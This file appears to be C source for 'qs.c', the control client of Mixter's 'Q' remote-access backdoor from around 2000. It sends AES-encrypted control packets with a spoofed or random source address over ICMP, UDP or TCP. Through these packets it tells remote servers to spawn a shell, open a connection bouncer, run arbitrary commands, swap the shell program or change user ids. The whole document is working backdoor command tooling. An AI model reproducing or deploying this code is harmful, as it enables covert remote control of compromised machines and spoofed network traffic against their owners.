/*   ___
   '/ _ \        Version 2.4 - Remote access and
   | | | |  redirection services with strong encryption.
   | |_| |           (c) 1999-2001 by Mixter
   '\__\_\    qs.c - remote server control */

#include "q.h"

void qusage (char *, char *);

int
main (int argc, char **argv)
{
  int opt = 0, crypt = 1, proto = -1, port = 0, bncport = 0, dlen = 0,
    code = 0;
  char buf[BS], bnchost[BS], *data = NULL;
  u32 src = 0, target = 0;

  alg = Q_ALG;
  memset (buf, 0, BS);
  memset (bnchost, 0, BS);

  while ((opt = getopt (argc, argv, "a:ni:s:p:SB:C:P:U:")) != EOF)
    switch (opt)
      {
      case 'a':
	__id = atoi (optarg);
	break;
      case 'n':
	crypt--;
	break;
      case 'i':
	switch (atoi (optarg))
	  {
	  case 'I':
	    proto = 0;
	    printf ("[*] protocol selection: ICMP\n");
	    break;
	  case 'U':
	    proto = 1;
	    printf ("[*] protocol selection: UDP\n");
	    break;
	  case 'T':
	    proto = 2;
	    printf ("[*] protocol selection: TCP\n");
	    break;
	  default:
	    qusage (argv[0], "protocol not supported");
	  }
	break;
      case 's':
	src = resolve (optarg);
	printf ("[*] source address: %s\n", optarg);
	break;
      case 'p':
	port = atoi (optarg);
	break;
      case 'S':
	code = 1;
	snprintf (buf, BS, "%s %d %d", CODE_SSHD, crypt, port);
	printf ("[*] request: shell, port %d\n", port);
	break;
      case 'B':
	code = 2;
	if (sscanf (optarg, "%s %d", bnchost, &bncport) < 2)
	  qusage (argv[0], "invalid port");
	snprintf (buf, BS, "%s %d %d %d %s", CODE_RED, crypt,
		  port, bncport, bnchost);
	printf ("[*] request: bouncer, listening port %d, dest ip %s, dest port %d\n",
		port, bnchost, bncport);
	break;
      case 'C':
	code = 3;
	snprintf (buf, BS, "%s %s", CODE_EXEC, optarg);
	printf ("[*] request: execute command '%s'\n", optarg);
	break;
      case 'P':
	code = 4;
	snprintf (buf, BS, "%s %s", CODE_SHL, optarg);
	printf ("[*] request: change shell to '%s'\n", optarg);
	break;
      case 'U':
	code = 5;
	snprintf (buf, BS, "%s %d", CODE_UID, atoi (optarg));
	printf ("[*] request: change bouncer user id to %d\n", atoi (optarg));
	break;
      default:
	qusage (argv[0], "");
      }

  if (src <= 0)
    src = (u32) (getrandom (0, 65535) + (getrandom (0, 65535) << 8));

  if (argv[optind] == NULL)
    qusage (argv[0], "no host selected");
  if (!code)
    qusage (argv[0], "no command selected");
  if ((code < 3) && (!port))
    qusage (argv[0], "no server source port selected");

more_fun:

  target = resolve (argv[optind]);
  if (!target)
    qusage (argv[0], "invalid hostname");

  printf ("[*] sending control packet to %s", argv[optind]);
  if (!crypt)
    printf (" (plaintext)\n");
  else
    printf (" (encrypted)\n");

  /* send pheerable double aes encrypted data */
  csa_key ();
  dlen = strlen (buf);
  data = aes_encrypt (buf, &dlen);
  memset (buf, 0, BS);
  strncpy (buf, data, BS);
  free (data);
  tfntransmit (src, target, proto, buf);

  if (argv[++optind] != NULL)
    goto more_fun;

  return (0);
}

void
qusage (char *a, char *b)
{
  printf ("\t%s - remote server control for Q by Mixter\n\n", a);
  printf ("usage:\n\t%s [-p] [-niasd] <-CSB> <host> [more hosts...]\n", a);
  printf ("\t-p <n>\t\tshell/bouncer server listening port\n");
  printf ("\t-n    \t\tinsecure plaintext servers     [encrypted]\n");
  printf ("\t-i <n>\t\tprotocol (I/U/T)               [random]\n");
  printf ("\t-a <n>\t\tcustom auth token              [hardcoded]\n");
  printf ("\t-s <n>\t\tsource IP                      [random]\n");
  printf ("\t-S\t\tspawn qshell server\n");
  printf ("\t-B <host port>\tspawn qbounce to <host port>\n");
  printf ("\t-C <cmd>\texecute <cmd>\n");
  printf ("\t-P <prg>\tset a new program as remote shell\n");
  printf ("\t-U <uid>\tset a new user id for redirecting\n");
  printf ("error: %s\n", b);
  exit (0);
}
